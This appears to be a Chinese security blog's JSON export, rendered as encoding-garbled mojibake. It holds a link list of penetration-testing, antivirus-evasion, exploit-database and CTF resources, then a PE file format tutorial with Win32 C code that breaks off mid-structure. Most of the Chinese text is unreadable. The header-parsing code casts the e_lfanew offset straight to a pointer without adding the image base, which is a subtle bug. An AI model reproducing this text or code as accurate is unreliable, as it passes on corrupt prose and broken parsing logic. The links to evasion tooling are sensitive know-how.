\nå®‰å…¨æŠ€èƒ½ -SecWiki                        \njinengzhou.pdf                        \næ¼æ´é“¶è¡Œ(BUGBANK) å®˜æ–¹ç½‘ç«™ | é¢†å…ˆçš„ç½‘ç»œå®‰å…¨æ¼æ´å‘ç°å“ç‰Œ | å¼€æ”¾å®‰å…¨çš„æå‡ºè€…ä¸å€¡å¯¼è€… | åˆ›æ–°çš„æ¼æ´å‘ç°å¹³å°                        \nGitHub - SecWiki&#x2F;sec-chartï¼š å®‰å…¨æ€ç»´å¯¼å›¾é›†åˆ\n\næ¸—é€æµ‹è¯•æ¸—é€æµ‹è¯•è‡ªå­¦ç¬”è®°\nhttps://websec.readthedocs.io/zh/latest/index.html\n\nä¿¡æ¯æ”¶é›†\nç›¸å…³æœç´¢ç»“æœ-å¤©çœ¼æŸ¥                                \nä¼æŸ¥æŸ¥ - ä¼ä¸šå·¥å•†ä¿¡æ¯æŸ¥è¯¢ç³»ç»Ÿ_æŸ¥ä¼ä¸š_æŸ¥è€æ¿_æŸ¥é£é™©å°±ä¸Šä¼æŸ¥æŸ¥!                                \nç«™é•¿å·¥å…· - ç«™é•¿ä¹‹å®¶\n\nå†…ç½‘æ¸—é€\nGitHub - Ridter&#x2F;Intranet_Penetration_Tips: 2018å¹´åˆæ•´ç†çš„ä¸€äº›å†…ç½‘æ¸—é€TIPSï¼Œåé¢æ›´æ–°çš„æ…¢ï¼Œæ‰€ä»¥æ•´ç†å‡ºæ¥å¸Œæœ›è·Ÿå°ä¼™ä¼´ä»¬ä¸€èµ·æ›´æ–°ç»´æŠ¤~\n\nWindowså®‰å…¨Linuxå®‰å…¨ç¡¬ä»¶å®‰å…¨Webå®‰å…¨çº¿ä¸‹é¶åœºæ­å»º\nGitHub(DVWA)\nGitHub&#x2F;pikachu: ä¸€ä¸ªå¥½ç©çš„Webå®‰å…¨-æ¼æ´æµ‹è¯•å¹³å°\nGitHub&#x2F;upload-labs 0.1 \nGitHub&#x2F;Sqli-labs\n\nåŒºå—é“¾å®‰å…¨äºŒè¿›åˆ¶å®‰å…¨\n 0x00sec å®‰å…¨ç¤¾åŒº- The Home of the Hacker\n\nå…æ€æ”¶é›†å…æ€çš„èµ„æ–™\n\nGitHub - TideSec&#x2F;BypassAntiVirus: è¿œæ§å…æ€ç³»åˆ—æ–‡ç« åŠé…å¥—å·¥å…·ï¼Œæ±‡æ€»æµ‹è¯•äº†äº’è”ç½‘ä¸Šçš„å‡ åç§å…æ€å·¥å…·ã€113ç§ç™½åå•å…æ€æ–¹å¼ã€8ç§ä»£ç ç¼–è¯‘å…æ€ã€è‹¥å¹²å…æ€å®æˆ˜æŠ€æœ¯ï¼Œå¹¶å¯¹å…æ€æ•ˆæœè¿›è¡Œäº†ä¸€ä¸€æµ‹è¯•ï¼Œä¸ºè¿œæ§çš„å…æ€å’Œæ€è½¯å¯¹æŠ—å…æ€æä¾›å‚è€ƒã€‚                            \nCnHack3r (CnHack3r) Â· GitHub                            \nmidisec (Midi Wan) Â· GitHub                            \nH4de5-7 (H4de5-7) &#x2F; Repositories Â· GitHub\n\næ¼æ´åˆ©ç”¨\nExploit Database - Exploits for Penetration Testers, Researchers, and Ethical Hackers\n\né€†å‘ç ´è§£çº¢è“é˜Ÿèµ„æºä»£ç å®¡è®¡\n\nGitHub - Firebasky&#x2F;Java: å…³äºå­¦ä¹ javaå®‰å…¨çš„ä¸€äº›çŸ¥è¯†,æ­£åœ¨å­¦ä¹ ä¸­ing,æ¬¢è¿fork and star                                    \nGitHub - ax1sX&#x2F;SecurityList: A list for Web Security and Code Audit                                    \nGitHub - j3ers3&#x2F;Hello-Java-Sec: â˜•ï¸ Java Securityï¼Œå®‰å…¨ç¼–ç å’Œä»£ç å®¡è®¡                                    \nGitHub  - threedr3am&#x2F;learnjavabug:  Javaå®‰å…¨ç›¸å…³çš„æ¼æ´å’ŒæŠ€æœ¯demoï¼ŒåŸç”ŸJavaã€Fastjsonã€Jacksonã€Hessian2ã€XMLååºåˆ—åŒ–æ¼æ´åˆ©ç”¨å’ŒSpringã€Dubboã€Shiroã€CASã€Tomcatã€RMIã€Nexusç­‰æ¡†æ¶\\ä¸­é—´ä»¶\\åŠŸèƒ½çš„exploitsä»¥åŠJava  Security Managerç»•è¿‡ã€Dubbo-Hessian2å®‰å…¨åŠ å›ºç­‰ç­‰å®è·µä»£ç ã€‚                                    \nGitHub - Y4tacker&#x2F;JavaSec: a rep for documenting my study, may be from 0 to 0.1                                    \nGitHub - DjiangLiu&#x2F;JavaSecInterview: Javaå®‰å…¨ç ”ç©¶ä¸å®‰å…¨å¼€å‘é¢è¯•é¢˜åº“ï¼ŒåŒæ˜¯ä¹Ÿæ˜¯å¸¸è§çŸ¥è¯†ç‚¹çš„æ¢³ç†å’Œæ€»ç»“ï¼ŒåŒ…å«é—®é¢˜å’Œè¯¦ç»†çš„ç­”æ¡ˆï¼Œè®¡åˆ’å®šæœŸæ›´æ–°                                    \nAfant1 (Afant1) Â· GitHub                                \nAfant1 - åšå®¢å›­\n\nJava\né£æ¸è¿œ - Webå®‰å…¨ä¸æ¸—é€æµ‹è¯•å­¦ä¹ ç¬”è®°                                \nJava å…¨æ ˆçŸ¥è¯†ä½“ç³»                                \nå°ç®€åšå®¢ - å°ç®€çš„æŠ€æœ¯æ ˆï¼Œä¸“æ³¨JavaåŠå…¶ä»–è®¡ç®—æœºæŠ€æœ¯ã€äº’è”ç½‘æŠ€æœ¯æ•™ç¨‹                                \npanda | çƒ­çˆ±å®‰å…¨çš„ç†æƒ³å°‘å¹´                                \nå¤§å½©ç¬”threedr3am                                \nå­¦ä¹ è·¯                                \nç´ åå…«                                \nSkyâ€™s è‡ªç•™åœ°                                \nTraLongâ€™Blog â€“ èœç‹—ä¹‹å®¶                                \nHi é«˜è™                                \nTRRQ-ä¿¡æ¯å®‰å…¨åšå®¢                                \nfmyyy                                \nArsene.Tang\n\npython\nbit4woo&#x2F;python_sec: pythonå®‰å…¨å’Œä»£ç å®¡è®¡ç›¸å…³èµ„æ–™æ”¶é›† resource collection of python security and code review                                \nYangâ€™s Harbor\n\nGOPHPçº¢è“å¯¹æŠ—ä¿¡æ¯å®‰å…¨çŸ¥è¯†åº“\nä¿¡æ¯å®‰å…¨çŸ¥è¯†åº“ vipread.com\nWooYunçŸ¥è¯†åº“                            \nä¹Œäº‘drops â€“ æ°¸ä¹…å­˜æ¡£ | æ¼æ´äººç”Ÿ                           \nä¹Œäº‘ Drops æ–‡ç« åœ¨çº¿æµè§ˆ\n\nCTFæ¯”èµ›[SycloverTeam Â· GitHub](https:&#x2F;&#x2F;github.com&#x2F;SycloverTeam)                            \n[jwt1399 (ç®€ç®€) Â· GitHub](https:&#x2F;&#x2F;github.com&#x2F;jwt1399)                            \n[Y4er (Y4er) Â· GitHub](https:&#x2F;&#x2F;github.com&#x2F;Y4er)                            \n[evilpan (evilpan) Â· GitHub](https:&#x2F;&#x2F;github.com&#x2F;evilpan)                            \n[Firebasky (Firebasky)](https:&#x2F;&#x2F;github.com&#x2F;Firebasky)                            \n[blackorbird (blackorbird) &#x2F; Repositories Â· GitHub](https:&#x2F;&#x2F;github.com&#x2F;blackorbird?tab&#x3D;repositories)                            \n[Jindom (Jindom) &#x2F; Repositories Â· GitHub](https:&#x2F;&#x2F;github.com&#x2F;Jindom?tab&#x3D;repositories)               \n[y1nglamore (é¢–å¥‡L&#39;Amore) Â· GitHub](https:&#x2F;&#x2F;github.com&#x2F;y1nglamore)                            \n[ZeddYu (Zeddy) Â· GitHub](https:&#x2F;&#x2F;github.com&#x2F;ZeddYu)                            \n[firmianay (ä¸€è“‘çƒŸé›¨) Â· GitHub](https:&#x2F;&#x2F;github.com&#x2F;firmianay)                            \n[meizjm3i (æ¢…å­é…’) Â· GitHub](https:&#x2F;&#x2F;github.com&#x2F;meizjm3i)                            \n[miaotony (MiaoTony) Â· GitHub](https:&#x2F;&#x2F;github.com&#x2F;miaotony)                            \n[VIDAR-TEAM Â· GitHub](https:&#x2F;&#x2F;github.com&#x2F;vidar-team)                            \n[EdenQwQ (Eden) Â· GitHub](https:&#x2F;&#x2F;github.com&#x2F;EdenQwQ)                            \n[lyleshaw (Lyle Shaw) Â· GitHub](https:&#x2F;&#x2F;github.com&#x2F;lyleshaw)                            \n[shw2018 (Hongwei Sun) Â· GitHub](https:&#x2F;&#x2F;github.com&#x2F;shw2018&#x2F;)                            \n[Aaisui (æœˆçŸ³) Â· GitHub](https:&#x2F;&#x2F;github.com&#x2F;Aaisui)                            \n[qrzbing (Qin Ruizhe) Â· GitHub](https:&#x2F;&#x2F;github.com&#x2F;qrzbing)                            \n[IanSmith123 (Les1ie) Â· GitHub](https:&#x2F;&#x2F;github.com&#x2F;IanSmith123)                            \n[Xyntax (Xyntax) &#x2F; Repositories Â· GitHub](https:&#x2F;&#x2F;github.com&#x2F;Xyntax?tab&#x3D;repositories)               [Ascotbe (å‘¨é›¨æ™¨) Â· GitHub](https:&#x2F;&#x2F;github.com&#x2F;Ascotbe)                            \n[dota-st (dota-st) &#x2F; Repositories Â· GitHub](https:&#x2F;&#x2F;github.com&#x2F;dota-st?tab&#x3D;repositories)          [bit4woo (bit4woo) Â· GitHub](https:&#x2F;&#x2F;github.com&#x2F;bit4woo)                            \n[Rvn0xsy (Rvn0xsy) &#x2F; Repositories Â· GitHub](https:&#x2F;&#x2F;github.com&#x2F;Rvn0xsy?tab&#x3D;repositories)         [squarepants0 Â· GitHub](https:&#x2F;&#x2F;github.com&#x2F;squarepants0)                            \n[0e0w Â· GitHub](https:&#x2F;&#x2F;github.com&#x2F;0e0w)                            \n[nszy007 (nszy007) &#x2F; Repositories Â· GitHub](https:&#x2F;&#x2F;github.com&#x2F;nszy007?tab&#x3D;repositories)          [Lz1y (Lz1y) &#x2F; Repositories Â· GitHub](https:&#x2F;&#x2F;github.com&#x2F;Lz1y?tab&#x3D;repositories)                     [NoSQL Injection - Payloads All The Things](https:&#x2F;&#x2F;swisskyrepo.github.io&#x2F;PayloadsAllTheThingsWeb&#x2F;NoSQL Injection&#x2F;)                           \n[SexyBeast233 Â· GitHub](https:&#x2F;&#x2F;github.com&#x2F;SexyBeast233)                               \n\nCTFå¯¼èˆª\nCTFç«™ç‚¹å¯¼èˆª | çŒ«æ‰é±¼é“ƒ                            \nCTFç¨‹åºçŒ¿å·¥å…·ç®±CTFå¯¼èˆªç«™|CTFå·¥å…·|AWD PLUS|æ¸—é€æµ‹è¯•|ç½‘ç»œå®‰å…¨|ä¿¡æ¯å®‰å…¨CTFå¯¼èˆªç«™ç‚¹                            \nCTFå¯¼èˆª | åˆ†äº«CTFã€IOTã€ICSã€Carç›¸å…³å†…å®¹\n\nCTFWiki\nç®€ä»‹ - CTF Wiki\n\nCTFçº¿ä¸Šé¶åœº\né¦–é¡µ - Bugku CTFï¼ˆæ¨èï¼‰\næ”»é˜²ä¸–ç•Œ(æ¨è)\nåŒ—äº¬é•¿äº­æœªæ¥ç§‘æŠ€æœ‰é™å…¬å¸ï¼ˆå¤§ä½¬ä¸“å±ï¼‰\nctf.show\nTryHackMe | Cyber Security Training\nBurpsuiteå®éªŒå®¤\nBUUCTFï¼ˆæ¨èï¼‰\nPWNTHEBOXï¼ˆæ¨èï¼‰\n\nå¸ˆå‚…ä»¬çš„ç½‘ç«™çº¢é˜Ÿå¤§ä½¬\nå€¾æ—‹çš„åšå®¢                            \nAnonySecâ€™Blog                            \nLionKing                            \n(5æ¡æ¶ˆæ¯) è°¢å…¬å­çš„åšå®¢_CSDNåšå®¢-åŸŸç¯å¢ƒæ¸—é€,ç½‘ç»œå®‰å…¨å·¥å…·ä½¿ç”¨é›†é”¦,linuxç³»ç»Ÿå®‰å…¨é¢†åŸŸåšä¸»                            \n(5æ¡æ¶ˆæ¯) å¤§æ–¹å­çš„åšå®¢_CSDNåšå®¢-ç»éªŒå¿ƒå¾—,æŠ€æœ¯åˆ†äº«,CTFé¢†åŸŸåšä¸»                            \nTeamsSix                            \nå°è‰çªåšå®¢                            \næµ…è“ â€˜s blog                            \nGeekbyâ€™s Blog                            \ntr1ple - åšå®¢å›­                            \nbitterz - åšå®¢å›­                            \nBlog                            \nMr.Be1ieVeâ€™s Treasure | Mr.Be1ieVeçš„åšå®¢ | Mr.Be1ieVeâ€™s Blog                            \nå­¦çš„è¶Šæ·±è¶Šå‘ç°è‡ªå·±çš„æ¸ºå°                            \n3gstudent-Blog                            \nConsT27â€™s Blog                            \nglzjin â€“ è¥¿å…´è¡—é“ç‰©ç†å®‰å…¨ç ”ç©¶å‘˜ &#x2F; Webæ‰‹@W&amp;M &#x2F; åŸå­¦ç”Ÿ@åŒ—äº¬è”åˆå¤§å­¦ &#x2F; ä¿¡æ¯å®‰å…¨çˆ±å¥½è€… &#x2F; å…¨æ ˆå¼€å‘ &#x2F; ä¸ºå¿ƒä¸­çš„ç¾å¥½è€Œæˆ˜                            \nwonderkunâ€™s | blog                            \nFlanker Sky | About security and coding\n\nç»¼åˆå¤§ä½¬\nå®‰å…¨å·¥å…·-NGC660å®‰å…¨å®éªŒå®¤                            \nç®€è¨€ä¹‹                            \nãŠå‰ã¯ã©ã“ã¾ã§è¦‹ãˆã¦ã„ã‚‹ - åƒ•ãŸã¡ã¯ ãã†ã‚„ã£ã¦ ã©ã“ã¾ã§è¡Œãã®ã ã‚ã†ã€ã©ã“ã¾ã§è¡Œã‘ã‚‹ã®ã ã‚ã†                            \nLanYunã®Blog                            \nGKSEC - ATD SECURITY TEAM  \né¦–é¡µ | ç¦»åˆ«æ­Œ                            \nskyâ€™s blog                            \nå¿å…ˆç”Ÿ - åšå®¢å›­                            \n(6æ¡æ¶ˆæ¯) yu22xçš„åšå®¢_CSDNåšå®¢-CTFSHOW webå…¥é—¨ç³»åˆ—,CTF show WEBç³»åˆ—,0dayé¢†åŸŸåšä¸»                            \nY4erçš„åšå®¢                            \nMisakiâ€™s Blog                            \nevilpan                            \nHpdoger                            \nMrkaixin                            \nlaziok Â· GitHub                            \nLongloneâ€™s Blog                            \n5altâ€™s Blog                            \nAryb1nâ€™s notebook                            \n(13æ¡æ¶ˆæ¯) å¥ˆæ²™å¤œå½±çš„åšå®¢_CSDNåšå®¢-CTF,CrackMe,Androidé¢†åŸŸåšä¸»                            \nhac425 - åšå®¢å›­                            \nMiaoTonyâ€™så°çª                            \nAnemoneâ€™s Blog                            \né—ªçƒä¹‹ç‹                            \nä¹¦é±¼                            \nZIKH26â€™s Blog                            \nMssn Harvey - CTFer &amp;&amp; DreamRedteam                            \nâ‘¨BIE                            \nXiaoLeiZhaoOçš„åšå®¢_CSDNåšå®¢-ç¬”è®°é¢†åŸŸåšä¸»                            \nhttps://guokeya.github.io/                            \nEVILCOS â€“ &#x2F;&#x2F;:alert(&#x2F;Hacking Symbol&#x2F;)&#x2F;&#x2F;ä½™å¼¦                            \né—²è¨€è¯­                            \nthestar | Donâ€™t ever let somebody tell you you canâ€™t do something, not even me                            \nMoominn - åšå®¢å›­                            \nåˆ†ç±» | Y0ngçš„åšå®¢                            \nATFWUSçš„åšå®¢_CSDNåšå®¢-ç®—æ³•,æ•°æ®ç»“æ„,CTF-PWNé¢†åŸŸåšä¸»                            \nYulateâ€™s Blog-this is my blog                            \n[mzq]çš„åšå®¢_CSDNåšå®¢-ç¬”è®°,ctf,buuctfé¢†åŸŸåšä¸»                            \nä¼šä¸‹é›ªçš„æ™´å¤©                            \næ‰€æœ‰æ ‡ç­¾ - byc_404â€™s blog                            \næ¸—é€æµ‹è¯•ä¸­å¿ƒ - åšå®¢å›­                            \nnovyâ€™s Blog                            \næ˜¥å‘Šé³¥ - åšå®¢å›­                            \næ‰€æœ‰æ ‡ç­¾ - zu1k\n\n","slug":"ç®€æ˜“å¯¼èˆª","date":"2021-01-23T07:50:23.000Z","categories_index":"å¯¼èˆª","tags_index":"èµ„æº","author_index":"Akpigs"},{"id":"86f54a7f49d13d2fe3670c2f70767f91","title":"PEæ–‡ä»¶ç»“æ„","content":"ä»€ä¹ˆæ˜¯æ–‡ä»¶å­˜å‚¨æ•°æ®çš„å®ä½“ã€‚\nä¸åŒçš„æ–‡ä»¶æ˜¯ç»™ä¸åŒçš„è½¯ä»¶å»ä½¿ç”¨çš„ã€‚ä¸åŒçš„æ–‡ä»¶ä¸»è¦æ˜¯æ ¼å¼ä¸åŒã€‚\næ ¼å¼å°±æ˜¯æ•°ç»„çš„æ’åˆ—ç»„ç»‡æ–¹å¼\nã€‚è½¯ä»¶è¯»å–æ–‡ä»¶ï¼ŒæŒ‰ç…§å›ºå®šçš„å½¢å¼å»è§£ææ–‡ä»¶çš„ã€‚\nä»€ä¹ˆæ˜¯PEæ–‡ä»¶ï¼ˆPortable Executableï¼‰å¯æ‰§è¡Œ æ–‡ä»¶çš„ç¼©å†™ã€‚è¿™ç§ç±»å‹çš„æ–‡ä»¶ï¼Œæ˜¯ä¾›windowsç³»ç»Ÿè§£æï¼Œè§£æå®Œäº†ä¹‹åèƒ½å¤Ÿåˆ›å»ºå‡ºè¿›ç¨‹å»è¿è¡Œçš„æ–‡ä»¶ã€‚\nPEå¤´éƒ¨ä¿¡æ¯ï¼ˆDOSå¤´ï¼ŒNTå¤´ï¼ŒåŒºæ®µè¡¨ï¼‰\næˆ‘ä»¬å­¦ä¹ PEæ–‡ä»¶å­¦ä¹ çš„æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿï¼Ÿå­¦ä¹ çš„å°±æ˜¯PEæ–‡ä»¶çš„æ ¼å¼ï¼Œå­¦ä¹ æ ¼å¼å°±æ˜¯åœ¨å­¦ä¹ ä¸€å †ç»“æ„ä½“ã€‚å¾ˆå¤šä¸œè¥¿éœ€è¦è®°å¿†ã€‚\nä¸ºäº†ä¾¿äºæˆ‘ä»¬è®°å¿†ï¼Œéœ€è¦ä¸€äº›è¾…åŠ©æ€§çš„å·¥å…·ã€‚\nPEå¤´éƒ¨ç²—ç•¥å›¾\n\nDOSå¤´ç®€ä»‹åœ¨windowsç³»ç»Ÿä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶åœ¨è®¾è®¡çš„æ—¶å€™ï¼Œè€ƒè™‘åˆ°äº†å…¼å®¹æ€§é—®é¢˜ã€‚åœ¨æ­£å¸¸çš„å¯æ‰§è¡Œæ–‡ä»¶çš„ä¸€å¼€å§‹çš„éƒ¨åˆ†ã€‚åµŒå…¥äº†ä¸€ä¸ªDOSå¯æ‰§è¡Œæ–‡ä»¶ã€‚ä½œç”¨å°±æ˜¯åœ¨MS-DOSç³»ç»Ÿä¸‹èƒ½å¤Ÿè¾“å‡ºä¸€è¡Œè¿™ä¸ªç¨‹åºä¸æ˜¯è¿è¡Œåœ¨æ­¤ç³»ç»Ÿä¸‹çš„ã€‚\n\n\nè¿™é‡Œæœ‰ä¸¤ä¸ªå­—æ®µæ˜¯æœ‰ç”¨çš„ï¼š\nç¬¬ä¸€ä¸ª e_magic æ°¸è¿œéƒ½æ˜¯ 0x4D 0x5A 0x5A4D ä½ éœ€è¦çŸ¥é“å¤§ç«¯å’Œå°ç«¯çš„çŸ¥è¯†ã€‚\næœ€åä¸€ä¸ª e_lfanew å®ƒæ˜¯çœŸæ­£çš„å¯æ‰§è¡Œæ–‡ä»¶çš„èµ·å§‹ä½ç½®ã€‚\n\nå®éªŒä¸€:å‡å¦‚æˆ‘ä»¬ä¿®æ”¹äº†e_magicå­—æ®µæˆ–è€…e_lfanewï¼ŒPEæ–‡ä»¶æ˜¯å¦è¿˜èƒ½è¿è¡Œï¼Ÿ\nå°†e_magicä¿®æ”¹ä¸ºâ€OZâ€ï¼Œä¿å­˜æ‰§è¡Œ\nå°†e_magicæ”¹å›â€MZâ€ï¼Œe_lfanewæ”¹ä¸º0x1000ï¼Œä¿å­˜æ‰§è¡Œ\n\n\n\nå°è¯•ä¹‹åä¸è¡Œï¼Œè¿™ä¸¤ä¸ªå­—æ®µæ˜¯é‡è¦å­—æ®µï¼ŒæŠ¹æ‰ç¨‹åºå°±æ— æ³•è¿è¡Œäº†ã€‚\n\nå®éªŒäºŒï¼šæŠ¹æ‰é™¤äº†e_magicå’Œe_lfanewä¹‹å¤–çš„å­—æ®µï¼Œå¯ä¸å¯ä»¥ã€‚\n\næ€ä¹ˆæ‰¾åˆ°DOSå¤´&#x2F;&#x2F;lpImageæ˜¯ReadFileæ‰“å¼€æ–‡ä»¶åçš„å†™å…¥çš„ç¼“å†²åŒºï¼ˆå †ç©ºé—´ï¼‰\nPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n&#x2F;&#x2F;pDosçš„e_magicå­—æ®µï¼Œä½œä¸ºæ˜¯å¦ä¸ºPEæ–‡ä»¶çš„æ ‡å¿—\npDos-&gt;e_magic &#x3D;&#x3D; IMAGE_DOS_SIGNATURE\n&#x2F;&#x2F;pDosçš„e_lfanewå­—æ®µå¯ä»¥æŒ‡å‘NTå¤´çš„ç©ºé—´\nPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)pDos-&gt;e_lfanew;\n\n&#x2F;&#x2F;ä¾‹ï¼š\n&#x2F;&#x2F;1 æ‰“å¼€æ–‡ä»¶\n\tHANDLE hFile &#x3D; CreateFile(\n\t\tPATH,\n\t\tGENERIC_ALL,\n\t\tNULL,\n\t\tNULL,\n\t\tOPEN_EXISTING,\n\t\tFILE_ATTRIBUTE_NORMAL,\n\t\tNULL\n\t);\n\t&#x2F;&#x2F;2 è·å–æ–‡ä»¶å¤§å°\n\tDWORD dwFileSize &#x3D; GetFileSize(hFile, NULL);\n\t&#x2F;&#x2F;3 ç”³è¯·ç©ºé—´å¹¶åˆå§‹åŒ–\n\tchar* buf &#x3D; new char[dwFileSize] &#123;0&#125;;\n\t&#x2F;&#x2F;4 è¯»å–æ–‡ä»¶\n\tDWORD dwRealSize &#x3D; 0;\n\tReadFile(hFile, buf, dwFileSize, &amp;dwRealSize, NULL);\n\nNTå¤´typedef struct _IMAGE_NT_HEADERS\n&#123;\n    DWORD Signature;                        &#x2F;&#x2F; [0x00]PEæ ‡è¯†\n    IMAGE_FILE_HEADER FileHeader;           &#x2F;&#x2F; [0x04]æ–‡ä»¶å¤´\n    IMAGE_OPTIONAL_HEADER32 OptionalHeader; &#x2F;&#x2F; [0x18]æ‰©å±•å¤´\n&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;\n\næ€ä¹ˆæ‰¾åˆ°Ntå¤´?\né€šè¿‡DOSå¤´çš„æœ€åä¸€ä¸ªå­—æ®µï¼še_lfanew æŒ‡å®šçš„æ˜¯NTå¤´çš„ä½ç½®\nSignatureï¼š\næ ‡è¯†ï¼šPE00\nå¯ä»¥å’Œé­”æ•°é…åˆï¼Œåˆ¤æ–­æ˜¯å¦æ˜¯PEæ–‡ä»¶ã€‚\næ°¸è¿œéƒ½æ˜¯ 0x50 0x45 0x00 0x00 0x00004550\n&#x2F;&#x2F;æ‰“å¼€PEæ–‡ä»¶åï¼Œç¬¬ä¸€ä¸ªæ®µå°±æ˜¯DOSå¤´éƒ¨\nPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n&#x2F;&#x2F;pDosçš„e_lfanewå­—æ®µå¯ä»¥æŒ‡å‘NTå¤´çš„ç©ºé—´ï¼Œä½¿ç”¨NTå¤´æ¥æ”¶\nPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)pDos-&gt;e_lfanew;\n\nIMAGE_FILE_HEADERï¼š\ntypedef struct _IMAGE_FILE_HEADER &#123;\n    WORD     Machine;\t\t\t        &#x2F;&#x2F;[0x04] ï¼ˆ1ï¼‰è¿è¡Œå¹³å°\n    WORD     NumberOfSections;\t\t&#x2F;&#x2F;[0x06] ï¼ˆ2ï¼‰åŒºæ®µçš„æ•°é‡*\n    DWORD   TimeDateStamp;\t\t    &#x2F;&#x2F;[0x08] ï¼ˆ3ï¼‰æ–‡ä»¶åˆ›å»ºæ—¶é—´\n    DWORD   PointerToSymbolTable;\t&#x2F;&#x2F;[0x0C] ï¼ˆ4ï¼‰ç¬¦å·è¡¨æŒ‡é’ˆ\n    DWORD   NumberOfSymbols;\t\t  &#x2F;&#x2F;[0x10] ï¼ˆ5ï¼‰ç¬¦å·çš„æ•°é‡\n    WORD     SizeOfOptionalHeader;&#x2F;&#x2F;[0x14] ï¼ˆ6ï¼‰æ‰©å±•å¤´å¤§å°*\n    WORD     Characteristics;\t\t  &#x2F;&#x2F;[0x16] ï¼ˆ7ï¼‰æ–‡ä»¶å±æ€§\n&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;\n\n\n\né‡è¦çš„ï¼š\nNumberOfSectionï¼šåŒºæ®µçš„æ•°é‡\nSizeOfOptionalHeaderï¼šæ‰©å±•å¤´çš„å¤§å°ã€‚å› ä¸ºæ‰©å±•å¤´ä¸­æ•°æ®ç›®å½•è¡¨çš„ä¸ªæ•°æ˜¯ä¸ç¡®å®šçš„ã€‚æ‰€ä»¥è¿™é‡Œéœ€è¦ä¸€ä¸ªå¤§å°\næœ‰ç”¨çš„ï¼š\nMachineï¼šè¿è¡Œå¹³å°\nTimeDateStampï¼šæ—¶é—´æˆ³ è¡¨æ˜æ˜¯åœ¨ä»€ä¹ˆæ—¶å€™ç¼–è¯‘çš„\næ‰‹å·¥è§£æ\nCode\n50 45 00 00 4C 01 05 00 91 CF 44 54 00 00 00 00\n00 00 00 00 E0 00 02 01 \n\n50 45 00 00 PEæ ‡è¯†\n01 4C è¿è¡Œå¹³å°\n00 æ²¡ç”¨\n05 åŒºæ®µæ•°é‡\n91 CF 44 54 æ—¶é—´æˆ³\nE0 æ‰©å±•å¤´å¤§å°\n0201 å±æ€§\nå› ä¸ºå¤§ç«¯å°ç«¯ï¼Œæˆ‘ä»¬éœ€è¦åè¿‡æ¥çœ‹\nå…³äºé•œåƒï¼Œæ˜ åƒï¼Œè™šæ‹Ÿåœ°å€ï¼Œç›¸å¯¹è™šæ‹Ÿåœ°å€é•œåƒï¼šå°±æ˜¯PEæ–‡ä»¶è‡ªèº«\næ˜ åƒï¼šå°±æ˜¯æ ¹æ®PEæ–‡ä»¶æ˜ å°„å‡ºæ¥çš„ï¼Œ\nè™šæ‹Ÿåœ°å€ï¼šç¨‹åºä¸­çš„å†…å­˜åœ°å€ï¼Œå°±æ˜¯è™šæ‹Ÿåœ°å€ã€‚\nç›¸å¯¹è™šæ‹Ÿåœ°å€ï¼šå°±æ˜¯ç›¸å¯¹äºåŠ è½½åŸºå€çš„åç§»ã€‚\næ–‡ä»¶å¤´IMAGE_FILE_HEADER\næ–‡ä»¶å¤´ç»“æ„ä½“typedef struct _IMAGE_FILE_HEADER &#123;\n    WORD    Machine;\t\t\t\t\t\t&#x2F;&#x2F;è¿è¡Œå¹³å°\n    WORD    NumberOfSections;\t\t\t\t&#x2F;&#x2F;åŒºæ®µçš„æ•°é‡\n    DWORD   TimeDateStamp;\t\t\t\t\t&#x2F;&#x2F;æ–‡ä»¶åˆ›å»ºçš„æ—¶é—´\n    DWORD   PointerToSymbolTable;\t\t\t&#x2F;&#x2F;ç¬¦å·è¡¨åç§»\n    DWORD   NumberOfSymbols;\t\t\t\t&#x2F;&#x2F;ç¬¦å·ä¸ªæ•°\n    WORD    SizeOfOptionalHeader;\t\t\t&#x2F;&#x2F;æ‰©å±•å¤´å¤§å°\n    WORD    Characteristics;\t\t\t\t&#x2F;&#x2F;PEæ–‡ä»¶çš„ä¸€äº›å±æ€§\n&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;\n\næ€ä¹ˆæ‰¾åˆ°æ–‡ä»¶å¤´&#x2F;&#x2F;æ‰“å¼€PEæ–‡ä»¶åï¼Œç¬¬ä¸€ä¸ªæ®µå°±æ˜¯DOSå¤´éƒ¨\nPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n&#x2F;&#x2F;pDosçš„e_lfanewå­—æ®µå¯ä»¥æŒ‡å‘NTå¤´çš„ç©ºé—´ï¼Œä½¿ç”¨NTå¤´æ¥æ”¶\nPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)pDos-&gt;e_lfanew;\n&#x2F;&#x2F;NTå¤´ç»“æ„ä½“çš„ç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯æŒ‡å‘æ‰©å±•å¤´\nPIMAGE_FILE_HEADER pFile &#x3D; (PIMAGE_FILE_HEADER)&amp;pNt-&gt;FileHeader;\n\næ‰©å±•å¤´IMAGE_OPTIONAL_HEADERï¼š\næ‰¾åˆ°æ‰©å±•å¤´&#x2F;&#x2F;æ‰“å¼€PEæ–‡ä»¶åï¼Œç¬¬ä¸€ä¸ªæ®µå°±æ˜¯DOSå¤´éƒ¨\nPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n&#x2F;&#x2F;pDosçš„e_lfanewå­—æ®µå¯ä»¥æŒ‡å‘NTå¤´çš„ç©ºé—´ï¼Œä½¿ç”¨NTå¤´æ¥æ”¶\nPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)pDos-&gt;e_lfanew;\n&#x2F;&#x2F;NTå¤´ç»“æ„ä½“çš„ç¬¬ä¸‰ä¸ªå‚æ•°å°±æ˜¯æŒ‡å‘æ‰©å±•å¤´\n\tPIMAGE_OPTIONAL_HEADER pOption &#x3D;  (PIMAGE_OPTIONAL_HEADER)&amp;pNt-&gt;OptionalHeader;\n\næ‰©å±•å¤´ç»“æ„ä½“typedef struct _IMAGE_OPTIONAL_HEADER &#123;\n    &#x2F;&#x2F; æ ‡å‡†åŸŸ\n    WORD    